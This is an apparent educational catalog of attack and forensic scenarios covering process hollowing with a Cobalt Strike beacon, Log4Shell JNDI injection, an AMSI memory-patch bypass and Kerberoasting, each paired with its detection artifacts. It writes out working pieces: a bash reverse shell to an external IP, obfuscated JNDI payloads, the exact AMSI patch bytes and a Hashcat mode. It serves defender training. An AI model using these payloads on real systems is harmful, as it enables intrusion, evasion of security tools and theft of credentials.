## 2. Complete Attack & DFIR Scenario Catalog (158 Scenarios)

### T1055.012: Process Hollowing & Cobalt Strike Beacon Loader
- **Scenario ID**: `process-hollowing`
- **Canonical URL**: https://attackexplorer.org/scenarios/process-hollowing
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=process-hollowing
- **Category**: MALWARE | **Severity**: CRITICAL
- **Subtitle**: Malware Analysis · svchost.exe Memory Unmapping & PE Injection
- **Overview**: Imagine an intruder who wants to enter a high-security bank without raising an alarm. Instead of breaking down the front door in a ski mask, they hire an official armored bank truck, freeze it inside the garage before the driver even starts the route, empty out all the legal bank cargo inside, load their own covert crew into the back of that exact armored truck, and release the brake. Every security camera and guard at the gate still sees the bank’s own trusted license plate and uniform. In this scenario (MITRE ATT&CK T1055.012), the attacker wants to run malicious code on Victim Laptop WKS-04 (10.10.4.15) without triggering antivirus or application-allowlisting rules. Instead of launching an unknown .exe file directly, the stage-1 dropper (Invoice_Q4.exe, PID 3104, the initial loader on disk) calls CreateProcessW to spawn a genuine Windows system process, C:\Windows\System32\svchost.exe (PID 4892, chosen because it carries a valid Microsoft digital signature that host firewalls and analysts trust), in a paused state (CREATE_SUSPENDED = 0x00000004, freezing its primary thread TID 4896 before any code runs) and receives back its master control handles (hProcess = 0x01C4 and hThread = 0x01C8). Using those returned handles, the loader reads the child’s PEB (PEB+0x10 ──▶ ImageBaseAddress = 0x00400000) and unmaps the legitimate Microsoft code from RAM (NtUnmapViewOfSection returning STATUS_SUCCESS = 0x00000000), allocates 264 KB of private RWX memory at that vacated 0x00400000 base and writes 270,336 bytes of the unpacked Cobalt Strike Beacon PE image into it (VirtualAllocEx + WriteProcessMemory with GrantedAccess = 0x1FFFFF), overwrites the frozen thread’s RCX entry-point register to 0x004014A0 and wakes the thread (SetThreadContext + ResumeThread decrementing SuspendCount from 1 to 0), and finally establishes an encrypted TLS 1.3 HTTPS C2 session from the hollowed svchost.exe to 185.220.101.42:443 (GET /jquery-3.3.1.min.js receiving HTTP 200 OK tasking with a 60s / 20% jitter sleep schedule).
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1106 · Native API: CreateProcessW): **CREATE SUSPENDED TARGET PROCESS** — Think of a stage director calling a famous, badge-carrying security guard onto the stage, but pressing the "Freeze" button the millisecond the guard steps through the door, before the guard can take a single step or read their official script. The attacker’s initial loader (Invoice_Q4.exe, PID 3104, the stage-1 file executed on Victim Laptop WKS-04, 10.10.4.15) calls CreateProcessW to start a real Windows system program: C:\Windows\System32\svchost.exe (PID 4892, chosen because svchost.exe carries a valid Microsoft digital signature, so security tools and analysts naturally expect to see it running in the background). However, the loader passes the creation flag CREATE_SUSPENDED = 0x00000004 (which tells the Windows kernel to build the process container in RAM and create its primary thread TID 4896, but freeze it at the starting line before its first instruction can execute). In response, the Windows kernel returns a populated PROCESS_INFORMATION structure containing process handle hProcess = 0x01C4 and thread handle hThread = 0x01C8 (handing Invoice_Q4.exe the master keys needed to inspect, empty, and rewrite svchost.exe’s memory in the next steps). When CreateProcessW is invoked with CREATE_SUSPENDED (0x00000004), ntdll!NtCreateUserProcess allocates the kernel process object (EPROCESS for PID 4892), maps ntdll.dll and the signed svchost.exe binary at base address 0x00400000, and parks the primary thread (TID 4896) at ntdll!RtlUserThreadStart with SuspendCount = 1 (keeping the child process completely inert in RAM while the parent dropper holds full PROCESS_ALL_ACCESS = 0x1FFFFF rights via handle hProcess = 0x01C4). On the diagram, follow Step #1 / Link #1 (#1→ CREATE_SUSPENDED / ⇠#1 ACK PID 4892) from Node ① (#1 Attacker Phishing & C2 Server) to Node ② (#2 Edge Firewall & Mail GW), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor). [Specs: API CALL=CreateProcessW("C:\Windows\System32\svchost.exe"); CREATION FLAGS=0x00000004 (CREATE_SUSPENDED); ANOMALOUS PARENT=Invoice_Q4.exe (Expected: services.exe)]
  - Stage 2 (T1055.012 · Process Injection: Process Hollowing): **UNMAP LEGITIMATE MEMORY IMAGE** — While the official armored truck is still frozen in the garage, the crew opens the back doors and removes every single crate of genuine bank cargo, leaving a completely hollow shell that still carries the official license plate on the outside. Now that svchost.exe (PID 4892, still frozen in memory so it cannot defend itself) is waiting, Invoice_Q4.exe (PID 3104) uses handle hProcess = 0x01C4 (received in Step #1) to read the child’s Process Environment Block (PEB, Windows’ internal process data table, queried at offset PEB+0x10 so the loader can find the exact memory address where svchost.exe was loaded: ImageBaseAddress = 0x00400000). The loader then calls ntdll!NtUnmapViewOfSection(hProcess = 0x01C4, BaseAddr = 0x00400000) (an undocumented native syscall that strips the original Microsoft svchost.exe code completely out of RAM), and the kernel replies with NTSTATUS = 0x00000000 (STATUS_SUCCESS, confirming that the 0x00400000 address slot inside PID 4892 is now completely empty and ready for the attacker’s payload). When NtUnmapViewOfSection executes in the kernel (nt!MiUnmapViewOfSection), the Windows Virtual Memory Manager detaches the file-backed SEC_IMAGE Virtual Address Descriptor (VAD) node mapped to C:\Windows\System32\svchost.exe at 0x00400000 and returns STATUS_SUCCESS = 0x00000000 (freeing the exact 0x00400000 base address so the replacement malware image can be loaded there in Step #3 without needing complex pointer relocations, while PID 4892 still retains its Microsoft-signed process identity). On the diagram, follow Step #2 / Link #2 (#2→ NtUnmapView / ⇠#2 RET 0x00400000) from Node ② (#2 Edge Firewall & Mail GW) to Node ③ (#3 Victim Laptop (WKS-04)), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor). [Specs: NATIVE SYSCALL=NtUnmapViewOfSection(hProcess, 0x00400000); TARGET IMAGE BASE=0x00400000 (Read from PEB + 0x10); MEMORY STATE=Original svchost.exe sections unmapped]
  - Stage 3 (T1055.012 · Process Hollowing: Memory Write): **ALLOCATE RWX & WRITE MALICIOUS PE** — Into that emptied-out armored truck, the intruder loads their own hidden gear and rewrites the route manual inside the cab, keeping the exterior paint job untouched so nobody outside notices the swap. Into that newly vacated base address (0x00400000, reusing the original base address freed in Step #2 so internal code pointers inside the malware do not break), Invoice_Q4.exe (PID 3104) uses handle hProcess = 0x01C4 (with GrantedAccess = 0x1FFFFF, granting full read, write, and allocation rights) to call VirtualAllocEx and reserve 264 KB (270,336 bytes) of private memory with PAGE_EXECUTE_READWRITE = 0x40 permissions (allowing the memory region to be both written to right now and executed as CPU instructions a moment later). It then calls WriteProcessMemory to stream the unpacked Cobalt Strike Beacon PE headers ("MZ" / 4D 5A, the Windows executable signature) and sections (.text.rdata.data) directly into svchost.exe’s RAM, receiving back lpNumberOfBytesWritten = 270,336 (confirming the entire payload and its entry point at 0x004014A0 are now mapped in memory without ever touching the hard drive). Across NtAllocateVirtualMemory and NtWriteVirtualMemory, the kernel creates an unbacked private memory region (MEM_PRIVATE with PAGE_EXECUTE_READWRITE = 0x40 at 0x00400000, whereas a legitimate binary loaded from disk uses file-backed SEC_IMAGE pages that strictly separate Read-Execute .text = 0x20 from Read-Write .data = 0x04). Committing 270,336 bytes containing an "MZ" PE header into unbacked RWX memory inside svchost.exe (PID 4892) is a primary forensic indicator of process hollowing. On the diagram, follow Step #3 / Link #3 (#3→ RWX WRITE / ⇠#3 ACK 264 KB) from Node ③ (#3 Victim Laptop (WKS-04)) to Node ④ (#4 Invoice_Q4.exe → svchost.exe), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor). [Specs: MEMORY PROTECTION=PAGE_EXECUTE_READWRITE (0x40 - RWX); BYTES WRITTEN=270,336 Bytes (MZ Header + 4 PE Sections); SYSMON ARTIFACT=Event ID 10 (GrantedAccess: 0x1FFFFF)]
  - Stage 4 (T1055.012 · Thread Context Hijacking & Execution): **PATCH THREAD CONTEXT & RESUME** — Before pressing "Unfreeze", the intruder turns the driver’s steering wheel and GPS toward their own secret destination (RCX = 0x004014A0). The moment the freeze button is released, the truck drives straight toward the attacker’s objective. Even though the Cobalt Strike Beacon is now sitting inside svchost.exe (PID 4892 at 0x00400000), the frozen primary thread (TID 4896, accessed via handle hThread = 0x01C8 from Step #1) is still pointing at the old Microsoft startup address. To redirect it, Invoice_Q4.exe (PID 3104) calls SetThreadContext(hThread = 0x01C8) to overwrite the thread’s RCX register with 0x004014A0 (Base 0x00400000 + EntryPoint RVA 0x14A0, on 64-bit Windows, a newly created suspended thread holds its upcoming program entry-point address inside RCX, so updating RCX aims the thread straight at the injected Beacon without needing CreateRemoteThread). Finally, it calls ResumeThread(hThread = 0x01C8), which decrements the thread’s suspend counter from 1 to 0 (returning PreviousSuspendCount = 1 and waking TID 4896 so svchost.exe immediately begins executing the Beacon). When NtSetContextThread and NtResumeThread complete in the kernel, Windows updates the thread’s saved trap frame (KTRAP_FRAME.Rcx = 0x004014A0) and releases TID 4896 from ntdll!RtlUserThreadStart into user-mode execution (allowing the original stage-1 loader Invoice_Q4.exe PID 3104 to exit while the Beacon runs inside svchost.exe PID 4892, which simultaneously fires kernel image-tampering callbacks because the active executable pages at 0x00400000 no longer match the signed svchost.exe file on disk). On the diagram, follow Step #4 / Link #4 (#4→ IMAGE TAMPERED / ⇠#4 ACK EID 25) from Node ④ (#4 Invoice_Q4.exe → svchost.exe) to Node ⑤ (#5 Corp DC01 & Internal Shares), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor). [Specs: NEW ENTRY POINT=RCX = 0x004014A0 (AddressOfEntryPoint); KERNEL DETECTION=Sysmon Event ID 25 (Image is replaced); THREAD STATE=Resumed (Running as PID 4892)]
  - Stage 5 (T1071.001 · Application Layer Protocol: Web C2): **OUTBOUND C2 BEACON OVER HTTPS** — The disguised armored truck now drives right past the perimeter gate guard (the firewall) to make a drop-off at an outside warehouse. The guard lets it pass because the truck’s badge says svchost.exe, until the central security room checks the GPS log and realizes that specific truck was never scheduled to leave the building. Now running actively inside the skin of C:\Windows\System32\svchost.exe (PID 4892, so path-based endpoint firewall rules see a trusted Windows binary requesting network access), the Cobalt Strike Beacon loads winhttp.dll, opens an encrypted TLS 1.3 HTTPS connection over TCP port 443 (standard web traffic port chosen to blend in with normal employee browsing) to the external Command-and-Control server at 185.220.101.42:443, and sends an HTTP GET request for /jquery-3.3.1.min.js (a Malleable C2 profile that hides RSA-encrypted victim host metadata inside the HTTP Cookie header to mimic a harmless jQuery script fetch). The C2 server (185.220.101.42:443) replies with HTTP 200 OK (disguised as an application/javascript response carrying AES-encrypted operator tasking and a 60-second callback interval with 20% random jitter, spacing out future check-ins to evade simple fixed-timer beacon detectors). Application-based host firewalls often permit C:\Windows\System32\svchost.exe (trusted by path as a core Windows service host binary) to initiate outbound HTTPS connections through the perimeter NAT. However, a legitimate svchost.exe is always spawned by services.exe and always includes a "-k <ServiceGroup>" command-line flag (which Windows uses to group related system services under a shared host process), so a bare svchost.exe (PID 4892) spawned by Invoice_Q4.exe (PID 3104) negotiating TLS 1.3 with JA3 fingerprint 72a589da586844d7f0818ce684948eea (a known Cobalt Strike TLS ClientHello signature) and polling /jquery-3.3.1.min.js every 60s (±20% jitter) is immediately caught by SIEM correlation. On the diagram, follow Step #5 / Link #5 (#5→ C2 BEACON / ⇠#5 RESP 1.4 KB) from Node ⑤ (#5 Corp DC01 & Internal Shares) to Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor), monitored by Node ⑥ (#6 SOC SIEM & Sysmon EDR Sensor). [Specs: C2 DESTINATION=185.220.101.42:443 (HTTPS); MALLEABLE PROFILE=GET /jquery-3.3.1.min.js; JA3 FINGERPRINT=72a589da586844d7f0818ce684948eea]

### CVE-2021-44228: Log4Shell JNDI Injection to Reverse Shell (DFIR Log Trace)
- **Scenario ID**: `log4shell-dfir`
- **Canonical URL**: https://attackexplorer.org/scenarios/log4shell-dfir
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=log4shell-dfir
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: Network & Web DFIR · Web Access Logs, Rogue LDAP, Java Spawning Bash & Auditd
- **Overview**: Imagine a building receptionist whose job is simply to write down every visitor’s name in a paper guestbook. One visitor walks up and says: "My name is ${Call-External-Courier-And-Run-His-Package}". Instead of writing that strange sentence down as plain ink on paper, the overly helpful receptionist actually picks up the phone, dials the outside courier, accepts a package from him, and executes its instructions inside the building. In this scenario (CISA Advisory AA21-356A / CVE-2021-44228), an attacker (91.214.124.88) compromises a Spring Boot Java server (app-prod-01, 10.20.1.15:8080 behind Nginx Reverse Proxy 10.20.1.10:443) simply by sending a specially crafted text string, ${jndi:ldap://91.214.124.88:1389/Basic/Command/Base64/...} (a dynamic lookup token that Log4j2 evaluates as an executable directory query rather than plain text), inside an HTTP header (X-Api-Version / User-Agent). When the Java application (PID 1420, running as service user tomcat) logs that header using vulnerable Apache Log4j2 (v2.14.1), Log4j’s message lookup feature reaches out to the attacker’s rogue Marshalsec LDAP server (91.214.124.88:1389), follows a referral to download a compiled Java class (Exploit.class from http://91.214.124.88:8888/Exploit.class), and spawns a child shell (/bin/sh PID 8912) that dials an interactive reverse shell back to 91.214.124.88:4444.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (Log4Shell JNDI Lookup) - Initial Access), T1059.004 (Command and Scripting Interpreter: Unix Shell - Execution)
- **Primary Analytical Sources**: NIST NVD & Apache Software Foundation: CVE-2021-44228 Apache Log4j2 JNDI Lookup Advisory (https://nvd.nist.gov/vuln/detail/CVE-2021-44228) | CISA Emergency Directive: Apache Log4j Vulnerability Guidance & Detection Signatures (https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance) | Swiss NCSC / GOVCERT.ch Technical Analysis: Zero-Day Exploit Targeting Popular Java Library Log4j (JNDI Class-Loading Anatomy) (https://www.ncsc.admin.ch/ncsc/en/home/aktuell/im-fokus/log4j.html)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **INJECT JNDI PAYLOAD IN HTTP HEADER** — The intruder walks up to the front reception desk and hands over a visitor badge whose "X-Api-Version / User-Agent" field contains a secret phone-call instruction instead of a normal browser name. The attacker (91.214.124.88) sends an HTTPS GET request to /api/v1/login on the Nginx Reverse Proxy (10.20.1.10:443), placing an obfuscated Log4j lookup expression, ${${lower:j}ndi:${lower:l}dap://91.214.124.88:1389/Exploit} (using nested ${lower:...} tokens to evade basic WAF string filters while still resolving to a JNDI lookup), inside the HTTP User-Agent and X-Api-Version headers (chosen because web servers automatically write these headers into their access and failed-login audit logs). Nginx logs the request and returns HTTP 401 Unauthorized after forwarding it to the Spring Boot backend (10.20.1.15, PID 1420), which immediately passes the unauthenticated request’s User-Agent string into logger.info() (triggering the vulnerability even though the login attempt itself returned 401). Web applications routinely pass HTTP headers like User-Agent or X-Api-Version into logger.info("Failed login from UA: " + userAgent) (recording client metadata for security audit trails). Because Log4j2 v2.0 to 2.14.1 had message pattern lookups enabled by default (designed to resolve variables like ${java:version} inside log lines), logging the rejected HTTP 401 request causes JndiLookup.lookup() inside java (PID 1420) to parse and execute the embedded "${jndi:ldap://...}" expression. On the diagram, follow Step #1 / Link #1 (#1→ HTTP JNDI / ⇠#1 RESP HTTP 401) from Node ① (#1 Attacker Exploit & Scanner) to Node ② (#2 DMZ WAF & Reverse Proxy), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM). [Specs: INJECTION VECTOR=HTTP Header: User-Agent / X-Api-Version; WAF BYPASS=${${lower:j}ndi:${lower:l}dap://...}; LOG ARTIFACT=/var/log/nginx/access.log]
  - Stage 2 (T1203 · Exploitation for Client/Server Execution): **LOG4J JNDI EVALUATION & OUTBOUND LDAP** — As the receptionist writes the visitor’s header into the guestbook, they read the "${jndi:ldap://...}" instruction out loud, pick up the office telephone, and dial the intruder’s external directory number (91.214.124.88:1389) to ask what to do next. Instead of writing the string literally to disk, Log4j’s MessagePatternConverter inside the Java process (PID 1420 on app-prod-01, 10.20.1.15) hands the "${jndi:ldap://...}" expression to the Java Naming and Directory Interface (JNDI, Java’s built-in API for looking up shared enterprise objects over a network directory). JNDI opens an outbound TCP connection from 10.20.1.15:49210 to port 1389 on the attacker’s rogue Marshalsec LDAP server at 91.214.124.88:1389 and sends a 118-byte LDAP SearchRequest for baseObject "Exploit" (forcing the internal web server to reach out across the firewall and ask the attacker’s directory server how to construct the logged object). JNDI supports pluggable directory protocols including LDAP, RMI, and DNS. Because Log4j2 v2.14.1 placed no domain whitelist on JndiManager.lookup(), an attacker-supplied ldap://91.214.124.88:1389/Exploit URL forces javax.naming.InitialContext.lookup() inside PID 1420 to transmit the outbound LDAP SearchRequest (118 B) and accept the rogue server’s LDAP SearchResultEntry response containing external class-loading attributes. In the documented Suricata / Zeek exchange from DMZ WAF & Reverse Proxy to Java App Server (app-prod-01), Java App Server (app-prod-01) responds with ALERT 118 B (confirming that the LDAP QUERY request succeeded on Java App Server (app-prod-01) and establishing the runtime state required for Step #3 LDAP REFERRAL & REMOTE CLASS LOADING). On the diagram, follow Step #2 / Link #2 (#2→ LDAP QUERY / ⇠#2 ALERT 118 B) from Node ② (#2 DMZ WAF & Reverse Proxy) to Node ③ (#3 Java App Server (app-prod-01)), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM). [Specs: JAVA CLASS=org.apache.logging.log4j.core.net.JndiManager; OUTBOUND CONN=10.20.1.15:49210 → 91.214.124.88:1389 (LDAP); NETWORK ANOMALY=DMZ Web Server making external LDAP query]
  - Stage 3 (T1105 · Ingress Tool Transfer (Remote Class Load)): **LDAP REFERRAL & REMOTE CLASS LOADING** — The voice on the other end of the phone says: "I don’t keep the package here, go download the blueprint from my web locker on port 8888 (javaCodeBase)." The Java server obediently fetches that blueprint and loads it directly into memory. The attacker’s LDAP server (91.214.124.88:1389) replies with a JNDI Naming Reference containing javaCodeBase="http://91.214.124.88:8888/" and javaFactory="Exploit" (directory attributes that tell the Java server that the requested object class is hosted at an external HTTP URL). Obeying those attributes, the JVM (PID 1420 on 10.20.1.15) sends an HTTP GET /Exploit.class request to 91.214.124.88:8888 and receives an HTTP 200 OK response delivering 1.8 KB (1,842 bytes) of compiled Java bytecode (application/java-vm with magic header 0xCAFEBABE, which URLClassLoader.findClass("Exploit") maps directly into JVM memory). When an LDAP SearchResultEntry includes javaClassName, javaCodeBase, and javaFactory, Java’s NamingManager.getObjectInstance() automatically spawns a URLClassLoader pointing to http://91.214.124.88:8888/Exploit.class (allowing the attacker to stream a 1.8 KB compiled Java class over standard HTTP and instantiate it inside PID 1420). On the diagram, follow Step #3 / Link #3 (#3→ Exploit.class / ⇠#3 RESP 1.8 KB) from Node ③ (#3 Java App Server (app-prod-01)) to Node ① (#1 Attacker Exploit & Scanner), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM). [Specs: LDAP ATTRIBUTE=javaCodeBase: http://91.214.124.88:8888/; STAGE 2 PAYLOAD=Exploit.class (Java Bytecode 0xCAFEBABE); EXECUTION SINK=Runtime.getRuntime().exec(String[] cmd)]
  - Stage 4 (T1059.004 · Command and Scripting Interpreter: Unix Shell): **JAVA SPAWNS /BIN/BASH REVERSE SHELL** — The moment the blueprint finishes loading on the receptionist’s desk, a spring-loaded mechanism inside its cover (static {} block) snaps open and dials a permanent private backdoor phone line (/bin/sh) straight back to the intruder on port 4444. The instant the JVM (java, PID 1420) initializes Exploit.class in memory, the class’s static {} initializer block invokes Runtime.getRuntime().exec() (Java’s native OS command runner). This causes /usr/bin/java (PID 1420, running as service account tomcat, uid=1001) to execute the Linux kernel execve syscall and spawn /bin/sh (PID 8912, PPID 1420) with command line: /bin/sh -c "bash -i >& /dev/tcp/91.214.124.88/4444 0>&1" (redirecting standard input, output, and error over a live TCP socket to 91.214.124.88:4444 so the attacker receives an interactive shell under the tomcat service user). By placing the payload inside the class’s static {} block or no-argument constructor, the attacker guarantees that OS commands execute under the tomcat service account (uid=1001) during Class.forName() initialization (where the kernel returns child PID 8912 and duplicates the socket file descriptors via dup2 before Log4j even finishes formatting the log line). On the diagram, follow Step #4 / Link #4 (#4→ SPAWN /BIN/SH / ⇠#4 ACK PID 8912) from Node ③ (#3 Java App Server (app-prod-01)) to Node ④ (#4 Java Log4j2 → /bin/bash Shell), monitored by Node ⑥ (#6 Linux Auditd & Elastic SIEM). [Specs: LINUX SYSCALL=syscall=59 (sys_execve) · ppid=1420 (java); SHELL COMMAND=bash -i >& /dev/tcp/91.214.124.88/4444 0>&1; EFFECTIVE USER=uid=1001(tomcat) gid=1001(tomcat)]

### T1562.001: Fileless AMSI Memory Bypass & Reflective DLL Injection
- **Scenario ID**: `amsi-reflective-dll`
- **Canonical URL**: https://attackexplorer.org/scenarios/amsi-reflective-dll
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=amsi-reflective-dll
- **Category**: MALWARE | **Severity**: CRITICAL
- **Subtitle**: Malware Analysis · Patching amsi.dll in Memory & Reflective Loader
- **Overview**: Imagine a burglar inside a jewelry store where every bag is inspected by an X-ray scanner at the counter (AMSI). Before pulling any tools out of their coat, the burglar reaches into the X-ray machine’s display wire inside their own room and solders a tiny jumper so the screen permanently flashes "BAG IS CLEAN". With the scanner blinded, they assemble their custom lockpick right in their hands without ever setting a tool down on the floor (the hard drive). Normally, when PowerShell runs a script or loads a .NET assembly, Windows Antimalware Scan Interface (AMSI, the built-in bridge that hands script buffers to the endpoint antivirus before execution) inspects the unencrypted code in memory. In this scenario (MITRE T1562.001 & T1620), the attacker on DEV-WKS-09 (10.10.4.55) first blinds AMSI inside their own PowerShell process (powershell.exe, PID 6120 under CORP\admin_clark) by calling VirtualProtect to make amsi.dll!AmsiScanBuffer (at 0x7FF91A042480) writable and overwriting its prologue with a 6-byte x64 patch (B8 57 00 07 80 C3 -> mov eax, 0x80070057; ret so every scan returns E_INVALIDARG / clean). With AMSI silenced inside PID 6120, PowerShell reflectively loads a 512 KB compiled C# agent DLL directly from a byte array in RAM ([System.Reflection.Assembly]::Load at 0x024A80000, avoiding any file write to the C: drive).
- **MITRE ATT&CK Techniques**: T1562.001 (Impair Defenses: Disable or Modify Tools (AMSI Bypass) - Defense Evasion), T1059.001 (Command and Scripting Interpreter: PowerShell - Execution), T1620 (Reflective Code Loading - Defense Evasion)
- **Primary Analytical Sources**: Microsoft Learn: Antimalware Scan Interface (AMSI) Developer Architecture (https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) | Microsoft PowerShell Team: PowerShell Operational Log Event ID 4104 (Script Block Logging) (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows) | The MITRE Corporation & Defender Threat Intelligence: MITRE ATT&CK T1620 & T1562.001: Reflective Code Loading & AMSI Memory Patching (https://attack.mitre.org/techniques/T1620/)
- **Kill-Chain Stages**:
  - Stage 1 (T1562.001 · Impair Defenses: Disable or Modify Tools): **LOCATE AMSISCANBUFFER IN MEMORY** — The intruder locates the exact inspection box (amsi.dll) mounted inside their room and unlocks its metal protective cover (changing memory protection from Read-Execute to Read-Write-Execute) so the internal wiring can be altered. Every PowerShell process automatically loads C:\Windows\System32\amsi.dll (the Windows Antimalware Scan Interface library that inspects scripts before they run) into its own user-mode memory space. Running inside powershell.exe (PID 6120, launched with -NoP -NonI -W Hidden -Exec Bypass under CORP\admin_clark), the attacker uses .NET P/Invoke to call LoadLibrary("amsi.dll") and GetProcAddress("AmsiScanBuffer"), receiving the function’s in-memory export address 0x7FF91A042480 (which pinpoints the exact byte offset where AMSI starts inspecting scripts), and prepares VirtualProtect to flip that page from PAGE_EXECUTE_READ (0x20) to PAGE_EXECUTE_READWRITE (0x40). Because amsi.dll operates in user mode (Ring 3, sharing the same virtual address space and permissions as powershell.exe PID 6120 rather than being isolated in the Windows kernel), any code running inside PowerShell can resolve amsi.dll!AmsiScanBuffer at 0x7FF91A042480 via P/Invoke (though executing this first stager script triggers a Warning-level PowerShell Operational Event ID 4104 ScriptBlock log before the patch is written). On the diagram, follow Step #1 / Link #1 (#1→ SCRIPTBLOCK / ⇠#1 ACK Warning) from Node ③ (#3 Admin Laptop Host (DEV-WKS-09)) to Node ④ (#4 powershell.exe (AMSI Patch + DLL)), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner). [Specs: TARGET MODULE=C:\Windows\System32\amsi.dll; TARGET EXPORT=AmsiScanBuffer (0x7FF91A042480); POWERSHELL LOG=Event ID 4104 (ScriptBlock Logging)]
  - Stage 2 (T1562.001 · In-Memory API Unhooking / Patching): **PATCH 6 BYTES OF AMSISCANBUFFER PROLOGUE** — With the inspection cover open, the intruder replaces the scanner’s sensor circuit with a 6-byte shortcut that immediately stamps "E_INVALIDARG / CLEAN" and exits before the camera even turns on. After calling VirtualProtect(0x7FF91A042480, 6, 0x40) (which unlocks the code page and returns the previous protection 0x20), powershell.exe (PID 6120) uses [System.Runtime.InteropServices.Marshal]::Copy to overwrite the first 6 bytes of AmsiScanBuffer (4C 8B DC 49 89 5B) with B8 57 00 07 80 C3 (which disassembles to "mov eax, 0x80070057; ret", instructing the CPU to immediately return error code E_INVALIDARG and exit the function). From this instant on, whenever PowerShell hands a script or assembly buffer to AMSI, AmsiScanBuffer returns E_INVALIDARG at byte 0 (which PowerShell treats as a non-detection, allowing subsequent payloads to run uninspected). AmsiScanBuffer normally validates its arguments and passes the script buffer to the registered antivirus provider. Overwriting its 6-byte prologue at 0x7FF91A042480 in RAM triggers a Copy-on-Write page split in PID 6120’s Virtual Address Descriptor (VAD) tree (converting the shared signed amsi.dll .text page into a private modified page that Kernel ETW TiProtectVM and EDR integrity scanners flag). On the diagram, follow Step #2 / Link #2 (#2→ PATCH 6 BYTES / ⇠#2 RET 6 Bytes) from Node ③ (#3 Admin Laptop Host (DEV-WKS-09)) to Node ② (#2 Perimeter NGFW & Proxy), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner). [Specs: INJECTED OPCODES=B8 57 00 07 80 C3 (mov eax, 0x80070057 ; ret); MEMORY ARTIFACT=Copy-on-Write (Private Modified Page in amsi.dll); AMSI RESULT=AMSI_RESULT_CLEAN / Bypassed]
  - Stage 3 (T1620 · Reflective Code Loading): **REFLECTIVE DLL LOADING FROM MEMORY BUFFER** — Now that the room’s X-ray scanner is blind, the intruder unfolds a complete communication radio directly out of a memorized blueprint in their head ([Reflection.Assembly]::Load), never placing a single file onto the floor where a floor sensor could spot it. With AMSI blinded inside PID 6120 (because normally calling Assembly::Load in .NET 4.8+ triggers an automatic AmsiScanBuffer check on the byte array, which would have caught the unencrypted DLL if Step 2 had not patched it first), the attacker decodes the stage-2 payload in RAM and invokes [System.Reflection.Assembly]::Load([byte[]]$dllBytes). The reflective loader allocates a 512 KB private RWX heap region at base address 0x024A80000 (mapping the MZ/PE headers, resolving imports, and invoking the agent entry point directly in memory without ever writing a .dll file to the hard drive or registering in the PEB Ldr module list). Reflective code loading parses the PE/COFF headers from a raw byte array and maps the 512 KB executable image into anonymous private heap memory (0x024A80000 with RWX protection, bypassing Sysmon Event ID 7 file-backed DLL load callbacks while leaving an unbacked MZ 4D 5A header in private RAM that PE-sieve and .NET Runtime ETW detect). On the diagram, follow Step #3 / Link #3 (#3→ REFLECTIVE DLL / ⇠#3 ALERT 512 KB) from Node ② (#2 Perimeter NGFW & Proxy) to Node ① (#1 HTTPS Payload Stager & C2), monitored by Node ⑥ (#6 PowerShell EID 4104 & EDR Scanner). [Specs: HEAP BASE ADDRESS=0x024A80000 (Private Unbacked RWX); EVASION BENEFIT=Not registered in PEB->Ldr Module List, zero disk footprint; BLUE TEAM HUNT=Scan private memory for MZ/PE magic bytes & Copy-on-Write pages]

### T1558.003: Active Directory Kerberoasting & Pass-the-Hash Lateral Movement
- **Scenario ID**: `ad-kerberoasting`
- **Canonical URL**: https://attackexplorer.org/scenarios/ad-kerberoasting
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=ad-kerberoasting
- **Category**: ACTIVE_DIRECTORY | **Severity**: HIGH
- **Subtitle**: SIEM Log Analysis · Windows Security Event IDs 4769, 4624 & 7045
- **Overview**: Imagine a theme park where any visitor with a basic entry wristband is allowed to walk up to the ticket booth and ask for a sealed VIP voucher to the SQL Rollercoaster. The booth seals that voucher using the rollercoaster manager’s secret password. Instead of riding the coaster, the attacker takes the sealed voucher home to their basement and tries millions of passwords per second until the seal pops open, without a single guard at the park knowing they are guessing. In Windows Active Directory, any standard domain user is allowed to ask the Domain Controller (DC01.corp.local, 10.10.1.5) for a Kerberos Service Ticket (TGS) to connect to any service registered with a Service Principal Name (SPN, the directory tag that links a network service like SQL Server to the service account that runs it). Because the Domain Controller encrypts that ticket using the password hash of the target service account (svc_mssql), an attacker on WS-FINANCE-04 (10.10.20.45, running Rubeus.exe PID 3920 under standard user CORP\m.davis) can request the ticket for MSSQLSvc/sql01.corp.local:1433 with downgraded RC4 encryption (etype 0x17, Windows Security Event ID 4769), crack the $krb5tgs$23$* hash offline with Hashcat (-m 13100) to recover svc_mssql’s password, authenticate over SMB (LogonType = 3, Event ID 4624) to SQL01.corp.local (10.10.5.20), and spawn PSEXESVC.exe (PID 5190 via services.exe PID 628, Event ID 7045) 